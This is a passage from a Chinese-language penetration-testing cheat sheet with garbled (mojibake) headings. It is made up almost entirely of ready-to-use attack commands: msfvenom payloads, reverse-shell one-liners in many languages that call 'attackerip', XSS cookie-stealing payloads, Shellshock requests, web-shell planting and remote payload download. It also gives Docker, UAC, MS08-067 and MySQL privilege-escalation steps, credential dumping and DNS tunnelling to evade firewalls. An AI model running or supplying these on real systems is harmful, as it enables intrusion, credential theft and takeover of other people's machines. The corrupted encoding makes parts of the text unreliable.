LHOST=127.0.0.1 LPORT=443 -b &quot;\\x00\\x0a\\x0d&quot; -a x86 --platform win -f c MSF ç”Ÿæˆåå¼¹ Python Shell1msfvenom -p cmd/unix/reverse_python LHOST=127.0.0.1 LPORT=443 -o shell.py MSF ç”Ÿæˆåå¼¹ ASP Shell1msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp -a x86 --platform win -o shell.asp MSF ç”Ÿæˆåå¼¹ Bash Shell1msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -o shell.sh MSF ç”Ÿæˆåå¼¹ PHP Shell123msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -o shell.phpadd &lt;?php at the beginningperl -i~ -0777pe&apos;s/^/&lt;?php \\n/&apos; shell.php MSF ç”Ÿæˆåå¼¹ Win Shell1msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe -a x86 --platform win -o shell.exe BASH åå¼¹ Shell1234567891011121314151617bash -i &gt;&amp; /dev/tcp/X.X.X.X/443 0&gt;&amp;1exec /bin/bash 0&amp;0 2&gt;&amp;0exec /bin/bash 0&amp;0 2&gt;&amp;00&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/attackerip/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;1960&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/attackerip/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196exec 5&lt;&gt;/dev/tcp/attackerip/4444 cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done # or: while read line 0&lt;&amp;5; do $line 2&gt;&amp;5 &gt;&amp;5; doneexec 5&lt;&gt;/dev/tcp/attackerip/4444cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done # or:while read line 0&lt;&amp;5; do $line 2&gt;&amp;5 &gt;&amp;5; done/bin/bash -i &gt; /dev/tcp/attackerip/8080 0&lt;&amp;1 2&gt;&amp;1/bin/bash -i &gt; /dev/tcp/X.X.X.X/443 0&lt;&amp;1 2&gt;&amp;1 PERL åå¼¹ Shell12345perl -MIO -e &apos;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;attackerip:443&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&apos;# Win å¹³å°perl -MIO -e &apos;$c=new IO::Socket::INET(PeerAddr,&quot;attackerip:4444&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&apos;perl -e &apos;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;â€™ RUBY åå¼¹ Shell12345ruby -rsocket -e &apos;exit if fork;c=TCPSocket.new(&quot;attackerip&quot;,&quot;443&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&apos;# Win å¹³å°ruby -rsocket -e &apos;c=TCPSocket.new(&quot;attackerip&quot;,&quot;443&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&apos;ruby -rsocket -e &apos;f=TCPSocket.open(&quot;attackerip&quot;,&quot;443&quot;).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&apos; PYTHON åå¼¹ Shell1python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;attackerip&quot;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos; PHP åå¼¹ Shell1php -r &apos;$sock=fsockopen(&quot;attackerip&quot;,443);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos; JAVA åå¼¹ Shell123r = Runtime.getRuntime()p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/attackerip/443;cat &lt;&amp;5 | while read line; do \\$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])p.waitFor() NETCAT åå¼¹ Shell12345678910nc -e /bin/sh attackerip 4444nc -e /bin/sh 192.168.37.10 443# å¦‚æœ -e å‚æ•°è¢«ç¦ç”¨ï¼Œå¯ä»¥å°è¯•ä»¥ä¸‹å‘½ä»¤# mknod backpipe p &amp;&amp; nc attackerip 443 0&lt;backpipe | /bin/bash 1&gt;backpipe/bin/sh | nc attackerip 443rm -f /tmp/p; mknod /tmp/p p &amp;&amp; nc attackerip 4443 0/tmp/# å¦‚æœä½ å®‰è£…é”™äº† netcat çš„ç‰ˆæœ¬ï¼Œè¯·å°è¯•ä»¥ä¸‹å‘½ä»¤rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc attackerip &gt;/tmp/f TELNET åå¼¹ Shell12# å¦‚æœ netcat ä¸å¯ç”¨æˆ–è€… /dev/tcpmknod backpipe p &amp;&amp; telnet attackerip 443 0&lt;backpipe | /bin/bash 1&gt;backpipe XTERM åå¼¹ Shell12345678910111213141516# http://baike.baidu.com/view/418628.htm# å¼€å¯ X æœåŠ¡å™¨ (:1 â€“ ç›‘å¬ TCP ç«¯å£ 6001)apt-get install xnestXnest :1# è®°å¾—æˆæƒæ¥è‡ªç›®æ ‡ IP çš„è¿æ¥xterm -display 127.0.0.1:1# æˆæƒè®¿é—®xhost +targetip# åœ¨ç›®æ ‡æœºå™¨ä¸Šè¿æ¥å›æˆ‘ä»¬çš„ X æœåŠ¡å™¨xterm -display attackerip:1/usr/openwin/bin/xterm -display attackerip:1or$ DISPLAY=attackerip:0 xterm Windows ç¼“å†²åŒºæº¢å‡ºåˆ©ç”¨å‘½ä»¤12msfvenom -p windows/shell_bind_tcp -a x86 --platform win -b &quot;\\x00&quot; -f cmsfvenom -p windows/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=443 -a x86 --platform win -e x86/shikata_ga_nai -b &quot;\\x00&quot; -f c COMMONLY USED BAD CHARACTERS:123456789101112131415161718192021\\x00\\x0a\\x0d\\x20 For http request\\x00\\x0a\\x0d\\x20\\x1a\\x2c\\x2e\\3a\\x5c Ending with (0\\n\\r_)# å¸¸ç”¨å‘½ä»¤:pattern createpattern offset (EIP Address)pattern offset (ESP Address)add garbage upto EIP value and add (JMP ESP address) in EIP . (ESP = shellcode )!pvefindaddr pattern_create 5000!pvefindaddr suggest!pvefindaddr modules!pvefindaddr nosafeseh!mona config -set workingfolder C:\\Mona\\%p!mona config -get workingfolder!mona mod!mona bytearray -b &quot;\\x00\\x0a&quot;!mona pc 5000!mona po EIP!mona suggest SEH â€“ ç»“æ„åŒ–å¼‚å¸¸å¤„ç† SEH(â€œStructured Exception Handlingâ€)ï¼Œå³ç»“æ„åŒ–å¼‚å¸¸å¤„ç†ï¼Œæ˜¯ windows æ“ä½œç³»ç»Ÿæä¾›ç»™ç¨‹åºè®¾è®¡è€…çš„å¼ºæœ‰åŠ›çš„å¤„ç†ç¨‹åºé”™è¯¯æˆ–å¼‚å¸¸çš„æ­¦å™¨ã€‚123456# https://en.wikipedia.org/wiki/Microsoft-specific_exception_handling_mechanisms#SEH# http://baike.baidu.com/view/243131.htm!mona suggest!mona nosafesehnseh=&quot;\\xeb\\x06\\x90\\x90&quot; (next seh chain)iseh= !pvefindaddr p1 -n -o -i (POP POP RETRUN or POPr32,POPr32,RETN) ROP (DEP) ROP(â€œReturn-Oriented Programmingâ€)æ˜¯è®¡ç®—æœºå®‰å…¨æ¼æ´åˆ©ç”¨æŠ€æœ¯ï¼Œè¯¥æŠ€æœ¯å…è®¸æ”»å‡»è€…åœ¨å®‰å…¨é˜²å¾¡çš„æƒ…å†µä¸‹æ‰§è¡Œä»£ç ï¼Œå¦‚ä¸å¯æ‰§è¡Œçš„å†…å­˜å’Œä»£ç ç­¾åã€‚ 123456789DEP(â€œData Execution Preventionâ€)æ˜¯ä¸€å¥—è½¯ç¡¬ä»¶æŠ€æœ¯ï¼Œåœ¨å†…å­˜ä¸Šä¸¥æ ¼å°†ä»£ç å’Œæ•°æ®è¿›è¡ŒåŒºåˆ†ï¼Œé˜²æ­¢æ•°æ®å½“åšä»£ç æ‰§è¡Œã€‚# https://en.wikipedia.org/wiki/Return-oriented_programming# https://zh.wikipedia.org/wiki/%E8%BF%94%E5%9B%9E%E5%AF%BC%E5%90%91%E7%BC%96%E7%A8%8B# https://en.wikipedia.org/wiki/Data_Execution_Prevention# http://baike.baidu.com/item/DEP/7694630!mona modules!mona ropfunc -m *.dll -cpb &quot;\\x00\\x09\\x0a&quot;!mona rop -m *.dll -cpb &quot;\\x00\\x09\\x0a&quot; (auto suggest) ##ASLR â€“ åœ°å€ç©ºé—´æ ¼å±€éšæœºåŒ– 12# https://en.wikipedia.org/wiki/Address_space_layout_randomization# http://baike.baidu.com/view/3862310.htm ##å¯»è›‹(EGG Hunter)æŠ€æœ¯ Egg huntingè¿™ç§æŠ€æœ¯å¯ä»¥è¢«å½’ä¸ºâ€œåˆ†çº§shellcodeâ€ï¼Œå®ƒä¸»è¦å¯ä»¥æ”¯æŒä½ ç”¨ä¸€å°æ®µç‰¹åˆ¶çš„shellcodeæ¥æ‰¾åˆ°ä½ çš„å®é™…çš„ï¼ˆæ›´å¤§çš„ï¼‰shellcodeï¼ˆæˆ‘ä»¬çš„â€˜é¸¡è›‹â€˜ï¼‰ï¼ŒåŸç†å°±æ˜¯é€šè¿‡åœ¨å†…å­˜ä¸­æœç´¢æˆ‘ä»¬çš„æœ€ç»ˆshellcodeã€‚æ¢å¥è¯è¯´ï¼Œä¸€æ®µçŸ­ä»£ç å…ˆæ‰§è¡Œï¼Œç„¶åå†å»å¯»æ‰¾çœŸæ­£çš„shellcodeå¹¶æ‰§è¡Œã€‚â€“ å‚è€ƒè‡ªçœ‹é›ªè®ºå›ï¼Œæ›´å¤šè¯¦æƒ…å¯ä»¥æŸ¥é˜…æˆ‘åœ¨ä»£ç æ³¨é‡Šä¸­å¢åŠ çš„é“¾æ¥ã€‚ 12345678# https://www.corelan.be/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/# http://www.pediy.com/kssd/pediy12/116190/831793/45248.pdf# http://www.fuzzysecurity.com/tutorials/expDev/4.html!mona jmp -r esp!mona egg -t lxxl\\xeb\\xc4 (jump backward -60)buff=lxxllxxl+shell!mona egg -t &apos;w00t&apos; GDB Debugger å¸¸ç”¨å‘½ä»¤12345678910111213141516171819202122232425262728293031323334# è®¾ç½®æ–­ç‚¹break *_start# æ‰§è¡Œä¸‹ä¸€ä¸ªå‘½ä»¤nextstepns# ç»§ç»­æ‰§è¡Œcontinuec# æ•°æ®checking &apos;REGISTERS&apos; and &apos;MEMORY&apos;# æ˜¾ç¤ºå¯„å­˜å™¨çš„å€¼: (Decimal,Binary,Hex)print /d â€“&gt; Decimalprint /t â€“&gt; Binaryprint /x â€“&gt; HexO/P :(gdb) print /d $eax$17 = 13(gdb) print /t $eax$18 = 1101(gdb) print /x $eax$19 = 0xd(gdb)# æ˜¾ç¤ºç‰¹å®šå†…å­˜åœ°å€çš„å€¼command : x/nyz (Examine)n â€“&gt; Number of fields to display ==&gt;y â€“&gt; Format for output ==&gt; c (character) , d (decimal) , x (Hexadecimal)z â€“&gt; Size of field to be displayed ==&gt; b (byte) , h (halfword), w (word 32 Bit) XSS å¤‡å¿˜å½•123456789101112131415161718192021222324252627282930https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet(&quot;&lt; iframes &gt; src=http://IP:PORT &lt;/ iframes &gt;&quot;)&lt;script&gt;document.location=http://IP:PORT&lt;/script&gt;&apos;;alert(String.fromCharCode(88,83,83))//\\&apos;;alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//\\&quot;;alert(String.fromCharCode(88,83,83))//â€“&gt;&lt;/SCRIPT&gt;&quot;&gt;&apos;&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;&quot;;!â€“&quot;&lt;XSS&gt;=&amp;amp;amp;&#123;()&#125;&lt;IMG SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;IMG SRC=javascript:alert(&apos;XSS&apos;)&gt;&lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&quot;&quot;&gt;&lt;IMG SRC=&amp;amp;amp;#106;&amp;amp;amp;#97;&amp;amp;amp;#118;&amp;amp;amp;#97;&amp;amp;amp;#115;&amp;amp;amp;#99;&amp;amp;amp;#114;&amp;amp;amp;#105;&amp;amp;amp;#112;&amp;amp;amp;#116;&amp;amp;amp;#58;&amp;amp;amp;#97;&amp;amp;amp;#108;&amp;amp;amp;#101;&amp;amp;amp;#114;&amp;amp;amp;#116;&amp;amp;amp;#40;&amp;amp;amp;#39;&amp;amp;amp;#88;&amp;amp;amp;#83;&amp;amp;amp;#83;&amp;amp;amp;#39;&amp;amp;amp;#41;&gt;&lt;IMG SRC=&amp;amp;amp;#0000106&amp;amp;amp;#0000097&amp;amp;amp;#0000118&amp;amp;amp;#0000097&amp;amp;amp;#0000115&amp;amp;amp;#0000099&amp;amp;amp;#0000114&amp;amp;amp;#0000105&amp;amp;amp;#0000112&amp;amp;amp;#0000116&amp;amp;amp;#0000058&amp;amp;amp;#0000097&amp;amp;amp;#0000108&amp;amp;amp;#0000101&amp;amp;amp;#0000114&amp;amp;amp;#0000116&amp;amp;amp;#0000040&amp;amp;amp;#0000039&amp;amp;amp;#0000088&amp;amp;amp;#0000083&amp;amp;amp;#0000083&amp;amp;amp;#0000039&amp;amp;amp;#0000041&gt;&lt;IMG SRC=&quot;jav ascript:alert(&apos;XSS&apos;);&quot;&gt;perl -e &apos;print &quot;&lt;IMG SRC=javascript:alert(\\&quot;XSS\\&quot;)&gt;&quot;;&apos; &gt; out&lt;BODY onload!#$%&amp;amp;()*~+-_.,:;?@[/|\\]^`=alert(&quot;XSS&quot;)&gt;(&quot;&gt;&lt; iframes http://google.com &lt; iframes &gt;)&lt;BODY BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;&lt;FRAMESET&gt;&lt;FRAME SRC=â€javascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;/FRAMESET&gt;&quot;&gt;&lt;script &gt;alert(document.cookie)&lt;/script&gt;%253cscript%253ealert(document.cookie)%253c/script%253e&quot;&gt;&lt;s&quot;%2b&quot;cript&gt;alert(document.cookie)&lt;/script&gt;%22/%3E%3CBODY%20onload=â€™document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)&apos;%3E&lt;img src=asdf onerror=alert(document.cookie)&gt; SSH Over SCTP (ä½¿ç”¨ Socat)1234567891011# è¿œç«¯æœåŠ¡å™¨# å‡è®¾ä½ å‡†å¤‡è®© SCTP socket ç›‘å¬ç«¯å£ 80/SCTP å¹¶ä¸” sshd ç«¯å£åœ¨ 22/TCP$ socat SCTP-LISTEN:80,fork TCP:localhost:22# æœ¬åœ°ç«¯# å°† SERVER_IP æ¢æˆè¿œç«¯æœåŠ¡å™¨çš„åœ°å€ï¼Œç„¶åå°† 80 æ¢æˆ SCTP ç›‘å¬çš„ç«¯å£å·$ socat TCP-LISTEN:1337,fork SCTP:SERVER_IP:80# åˆ›å»º socks ä»£ç†# æ›¿æ¢ username å’Œ -p çš„ç«¯å£å·$ ssh -lusername localhost -D 8080 -p 1337 ä½¿ç”¨æ´‹è‘±ç½‘ç»œ12345678910111213141516171819# å®‰è£…æœåŠ¡$ apt-get install tor torsocks# ç»‘å®š ssh åˆ° tor æœåŠ¡ç«¯å£ 80# /etc/tor/torrcSocksPolicy accept 127.0.0.1SocksPolicy accept 192.168.0.0/16Log notice file /var/log/tor/notices.logRunAsDaemon 1HiddenServiceDir /var/lib/tor/ssh_hidden_service/HiddenServicePort 80 127.0.0.1:22PublishServerDescriptor 0$ /etc/init.d/tor start$ cat /var/lib/tor/ssh_hidden_service/hostname3l5zstvt1zk5jhl662.onion# ssh å®¢æˆ·ç«¯è¿æ¥$ apt-get install torsocks$ torsocks ssh login@3l5zstvt1zk5jhl662.onion -p 80 Metagoofil â€“ å…ƒæ•°æ®æ”¶é›†å·¥å…· Metagoofil æ˜¯ä¸€æ¬¾åˆ©ç”¨Googleæ”¶é›†ä¿¡æ¯çš„å·¥å…·ã€‚ 123# http://www.edge-security.com/metagoofil.php# å®ƒå¯ä»¥è‡ªåŠ¨åœ¨æœç´ å¼•æ“ä¸­æ£€ç´¢å’Œåˆ†ææ–‡ä»¶ï¼Œè¿˜å…·æœ‰æä¾›Macåœ°å€ï¼Œç”¨æˆ·ååˆ—è¡¨ç­‰å…¶ä»–åŠŸèƒ½$ python metagoofil.py -d example.com -t doc,pdf -l 200 -n 50 -o examplefiles -f results.html åˆ©ç”¨ Shellshock12345678910111213# ä¸€ä¸ªå‘ç°å¹¶åˆ©ç”¨æœåŠ¡å™¨ Shellshock çš„å·¥å…·# https://github.com/nccgroup/shocker$ ./shocker.py -H 192.168.56.118 --command &quot;/bin/cat /etc/passwd&quot; -c /cgi-bin/status --verbose# æŸ¥çœ‹æ–‡ä»¶$ echo -e &quot;HEAD /cgi-bin/status HTTP/1.1\\r\\nUser-Agent: () &#123; :;&#125;; echo \\$(&lt;/etc/passwd)\\r\\nHost: vulnerable\\r\\nConnection: close\\r\\n\\r\\n&quot; | nc 192.168.56.118 80# ç»‘å®š shell$ echo -e &quot;HEAD /cgi-bin/status HTTP/1.1\\r\\nUser-Agent: () &#123; :;&#125;; /usr/bin/nc -l -p 9999 -e /bin/sh\\r\\nHost: vulnerable\\r\\nConnection: close\\r\\n\\r\\n&quot; | nc 192.168.56.118 80# åå¼¹ Shell$ nc -l -p 443$ echo &quot;HEAD /cgi-bin/status HTTP/1.1\\r\\nUser-Agent: () &#123; :;&#125;; /usr/bin/nc 192.168.56.103 443 -e /bin/sh\\r\\nHost: vulnerable\\r\\nConnection: close\\r\\n\\r\\n&quot; | nc 192.168.56.118 80 è·å– Docker çš„ Root12345678910111213141516171819202122232425262728# è·å– Docker çš„ Root# user å¿…é¡»åœ¨ docker ç”¨æˆ·ç»„ä¸­ek@victum:~/docker-test$ iduid=1001(ek) gid=1001(ek) groups=1001(ek),114(docker)ek@victum:~$ mkdir docker-testek@victum:~$ cd docker-testek@victum:~$ cat &gt; DockerfileFROM debian:wheezyENV WORKDIR /stuffRUN mkdir -p $WORKDIRVOLUME [ $WORKDIR ]WORKDIR $WORKDIR&lt;&lt; EOFek@victum:~$ docker build -t my-docker-image .ek@victum:~$ docker run -v $PWD:/stuff -t my-docker-image /bin/sh -c \\&apos;cp /bin/sh /stuff &amp;&amp; chown root.root /stuff/sh &amp;&amp; chmod a+s /stuff/sh&apos;./shwhoami# rootek@victum:~$ docker run -v /etc:/stuff -t my-docker-image /bin/sh -c &apos;cat /stuff/shadow&apos; ä½¿ç”¨ DNS éš§é“ç»•è¿‡é˜²ç«å¢™12345678910111213141516171819202122232425# è®©æ•°æ®å’Œå‘½ä»¤ä½¿ç”¨ DNS éš§é“ä¼ è¾“ä»¥ç»•è¿‡é˜²ç«å¢™çš„æ£€æŸ¥# dnscat2 æ”¯æŒä»ç›®æ ‡ä¸»æœºä¸Šé¢ä¸Šä¼ å’Œä¸‹è½½å‘½ä»¤æ¥è·å–æ–‡ä»¶ã€æ•°æ®å’Œç¨‹åº# æœåŠ¡å™¨ (æ”»å‡»è€…)$ apt-get update$ apt-get -y install ruby-dev git make g++$ gem install bundler$ git clone https://github.com/iagox86/dnscat2.git$ cd dnscat2/server$ bundle install$ ruby ./dnscat2.rbdnscat2&gt; New session established: 16059dnscat2&gt; session -i 16059# å®¢æˆ·æœº (ç›®æ ‡)# https://downloads.skullsecurity.org/dnscat2/# https://github.com/lukebaggett/dnscat2-powershell$ dnscat --host &lt;dnscat server_ip&gt;ç¼–è¯‘ Assemble ä»£ç $ nasm -f elf32 simple32.asm -o simple32.o$ ld -m elf_i386 simple32.o simple32$ nasm -f elf64 simple.asm -o simple.o$ ld simple.o -o simple ä½¿ç”¨éäº¤äº’ Shell æ‰“å…¥å†…ç½‘1234567891011121314# ç”Ÿæˆ shell ä½¿ç”¨çš„ ssh å¯†é’¥$ wget -O - -q &quot;http://domain.tk/sh.php?cmd=whoami&quot;$ wget -O - -q &quot;http://domain.tk/sh.php?cmd=ssh-keygen -f /tmp/id_rsa -N \\&quot;\\&quot; &quot;$ wget -O - -q &quot;http://domain.tk/sh.php?cmd=cat /tmp/id_rsa&quot;# å¢åŠ ç”¨æˆ· tempuser $ useradd -m tempuser$ mkdir /home/tempuser/.ssh &amp;&amp; chmod 700 /home/tempuser/.ssh$ wget -O - -q &quot;http://domain.tk/sh.php?cmd=cat /tmp/id_rsa&quot; &gt; /home/tempuser/.ssh/authorized_keys$ chmod 700 /home/tempuser/.ssh/authorized_keys$ chown -R tempuser:tempuser /home/tempuser/.ssh# åå¼¹ ssh shell$ wget -O - -q &quot;http://domain.tk/sh.php?cmd=ssh -i /tmp/id_rsa -o StrictHostKeyChecking=no -R 127.0.0.1:8080:192.168.20.13:8080 -N -f tempuser@&lt;attacker_ip&gt;&quot; åˆ©ç”¨ POST è¿œç¨‹å‘½ä»¤æ‰§è¡Œè·å– Shell123456789101112attacker:~$ curl -i -s -k -X &apos;POST&apos; --data-binary $&apos;IP=%3Bwhoami&amp;submit=submit&apos; &apos;http://victum.tk/command.php&apos;attacker:~$ curl -i -s -k -X &apos;POST&apos; --data-binary $&apos;IP=%3Becho+%27%3C%3Fphp+system%28%24_GET%5B%22cmd%22%5D%29%3B+%3F%3E%27+%3E+..%2Fshell.php&amp;submit=submit&apos; &apos;http://victum.tk/command.php&apos;attacker:~$ curl http://victum.tk/shell.php?cmd=id# åœ¨æœåŠ¡å™¨ä¸Šä¸‹è½½ shell (phpshell.php)http://victum.tk/shell.php?cmd=php%20-r%20%27file_put_contents%28%22phpshell.php%22,%20fopen%28%22http://attacker.tk/phpshell.txt%22,%20%27r%27%29%29;%27# è¿è¡Œ nc å¹¶æ‰§è¡Œ phpshell.phpattacker:~$ nc -nvlp 1337 ä»¥ç®¡ç†å‘˜èº«ä»½åœ¨ Win7 ä¸Šåå¼¹å…·æœ‰ç³»ç»Ÿæƒé™çš„ Shell12345678910111213141516171819202122232425262728293031323334353637383940414243msfvenom â€“p windows/shell_reverse_tcp LHOST=192.168.56.102 â€“f exe &gt; danger.exe# æ˜¾ç¤ºè´¦æˆ·é…ç½®net user &lt;login&gt;# Kali ä¸Šä¸‹è½½ psexechttps://technet.microsoft.com/en-us/sysinternals/bb897553.aspx# ä½¿ç”¨ powershell è„šæœ¬ä¸Šä¼  psexec.exe åˆ°ç›®æ ‡æœºå™¨echo $client = New-Object System.Net.WebClient &gt; script.ps1echo $targetlocation = &quot;http://192.168.56.102/PsExec.exe&quot; &gt;&gt; script.ps1echo $client.DownloadFile($targetlocation,&quot;psexec.exe&quot;) &gt;&gt; script.ps1powershell.exe -ExecutionPolicy Bypass -NonInteractive -File script.ps1# ä½¿ç”¨ powershell è„šæœ¬ä¸Šä¼  danger.exe åˆ°ç›®æ ‡æœºå™¨echo $client = New-Object System.Net.WebClient &gt; script2.ps1echo $targetlocation = &quot;http://192.168.56.102/danger.exe&quot; &gt;&gt; script2.ps1echo $client.DownloadFile($targetlocation,&quot;danger.exe&quot;) &gt;&gt; script2.ps1powershell.exe -ExecutionPolicy Bypass -NonInteractive -File script2.ps1# ä½¿ç”¨é¢„ç¼–è¯‘çš„äºŒè¿›åˆ¶æ–‡ä»¶ç»•è¿‡ UAC:https://github.com/hfiref0x/UACME# ä½¿ç”¨ powershell è„šæœ¬ä¸Šä¼  https://github.com/hfiref0x/UACME/blob/master/Compiled/Akagi64.exe åˆ°ç›®æ ‡æœºå™¨echo $client = New-Object System.Net.WebClient &gt; script2.ps1echo $targetlocation = &quot;http://192.168.56.102/Akagi64.exe&quot; &gt;&gt; script3.ps1echo $client.DownloadFile($targetlocation,&quot;Akagi64.exe&quot;) &gt;&gt; script3.ps1powershell.exe -ExecutionPolicy Bypass -NonInteractive -File script3.ps1# åœ¨ Kali ä¸Šåˆ›å»ºç›‘å¬nc -lvp 4444# ä»¥ç³»ç»Ÿæƒé™ä½¿ç”¨ Akagi64 è¿è¡Œ danger.exe Akagi64.exe 1 C:\\Users\\User\\Desktop\\danger.exe# åœ¨ Kali ä¸Šåˆ›å»ºç›‘å¬nc -lvp 4444# ä¸‹ä¸€æ­¥å°±ä¼šåå¼¹ç»™æˆ‘ä»¬ä¸€ä¸ªæè¿‡æƒçš„ shell# ä»¥ç³»ç»Ÿæƒé™ä½¿ç”¨ PsExec è¿è¡Œ danger.exe psexec.exe â€“i â€“d â€“accepteula â€“s danger.exe ä»¥æ™®é€šç”¨æˆ·èº«ä»½åœ¨ Win7 ä¸Šåå¼¹å…·æœ‰ç³»ç»Ÿæƒé™çš„ Shell12345678910111213141516171819202122232425262728293031323334https://technet.microsoft.com/en-us/security/bulletin/dn602597.aspx #ms15-051https://www.fireeye.com/blog/threat-research/2015/04/probable_apt28_useo.htmlhttps://www.exploit-db.com/exploits/37049/# æŸ¥æ‰¾ç›®æ ‡æœºå™¨æ˜¯å¦å®‰è£…äº†è¡¥ä¸ï¼Œè¾“å…¥å¦‚ä¸‹å‘½ä»¤wmic qfe getwmic qfe | find &quot;3057191&quot;# ä¸Šä¼ ç¼–è¯‘åçš„åˆ©ç”¨ç¨‹åºå¹¶è¿è¡Œå®ƒhttps://github.com/hfiref0x/CVE-2015-1701/raw/master/Compiled/Taihou64.exe# é»˜è®¤æƒ…å†µä¸‹å…¶ä¼šä»¥ç³»ç»Ÿæƒé™æ‰§è¡Œ cmd.exeï¼Œä½†æˆ‘ä»¬éœ€è¦æ”¹å˜æºä»£ç ä»¥è¿è¡Œæˆ‘ä»¬ä¸Šä¼ çš„ danger.exe# https://github.com/hfiref0x/CVE-2015-1701 ä¸‹è½½å®ƒå¹¶å®šä½åˆ° &quot;main.c&quot;# ä½¿ç”¨ wce.exe è·å–å·²ç™»å½•ç”¨æˆ·çš„æ˜æ–‡è´¦å·å¯†ç http://www.ampliasecurity.com/research/windows-credentials-editor/wce -w# ä½¿ç”¨ pwdump7 è·å–å…¶ä»–ç”¨æˆ·çš„å¯†ç å“ˆå¸Œå€¼http://www.heise.de/download/pwdump.html# we can try online hash cracking tools such crackstation.netMS08-067 â€“ ä¸ä½¿ç”¨ Metasploit$ nmap -v -p 139, 445 --script=smb-check-vulns --script-args=unsafe=1 192.168.31.205$ searchsploit ms08-067$ python /usr/share/exploitdb/platforms/windows/remote/7132.py 192.168.31.205 1 é€šè¿‡ MySQL Root è´¦æˆ·å®ç°ææƒ12345678910111213141516171819# Mysql Server version: 5.5.44-0ubuntu0.14.04.1 (Ubuntu)$ wget 0xdeadbeef.info/exploits/raptor_udf2.c$ gcc -g -c raptor_udf2.c$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lcmysql -u root -pmysql&gt; use mysql;mysql&gt; create table foo(line blob);mysql&gt; insert into foo values(load_file(&apos;/home/user/raptor_udf2.so&apos;));mysql&gt; select * from foo into dumpfile &apos;/usr/lib/mysql/plugin/raptor_udf2.so&apos;;mysql&gt; create function do_system returns integer soname &apos;raptor_udf2.so&apos;;mysql&gt; select * from mysql.func;mysql&gt; select do_system(&apos;echo &quot;root:passwd&quot; | chpasswd &gt; /tmp/out; chown user:user /tmp/out&apos;);user:~$ su -Password:user:~# whoamirootroot:~# iduid=0(root) gid=0(root) groups=0(root) ä½¿ç”¨ LD_PRELOAD æ³¨å…¥ç¨‹åº123$ wget https://github.com/jivoi/pentest/ldpreload_shell.c$ gcc -shared -fPIC ldpreload_shell.c -o ldpreload_shell.so$ sudo -u user LD_PRELOAD=/tmp/ldpreload_shell.so /usr/local/bin/somesoft é’ˆå¯¹ OpenSSH ç”¨æˆ·è¿›è¡Œæšä¸¾æ—¶åºæ”»å‡» æšä¸¾æ—¶åºæ”»å‡»(â€œEnumeration Timing Attackâ€)å±äºä¾§ä¿¡é“æ”»å‡»/æ—è·¯æ”»å‡»(Side Channel Attack)ï¼Œä¾§ä¿¡é“æ”»å‡»æ˜¯æŒ‡åˆ©ç”¨ä¿¡é“å¤–çš„ä¿¡æ¯ï¼Œæ¯”å¦‚åŠ è§£å¯†çš„é€Ÿåº¦/åŠ è§£å¯†æ—¶èŠ¯ç‰‡å¼•è„šçš„ç”µå‹/å¯†æ–‡ä¼ è¾“çš„æµé‡å’Œé€”å¾„ç­‰è¿›è¡Œæ”»å‡»çš„æ–¹å¼ï¼Œä¸€ä¸ªè¯å½¢å®¹å°±æ˜¯â€œæ—æ•²ä¾§å‡»â€ã€‚â€“å‚è€ƒè‡ª shotgun åœ¨çŸ¥ä¹ä¸Šçš„è§£é‡Šã€‚osueta æ˜¯ä¸€ä¸ªç”¨äºå¯¹ OpenSSH 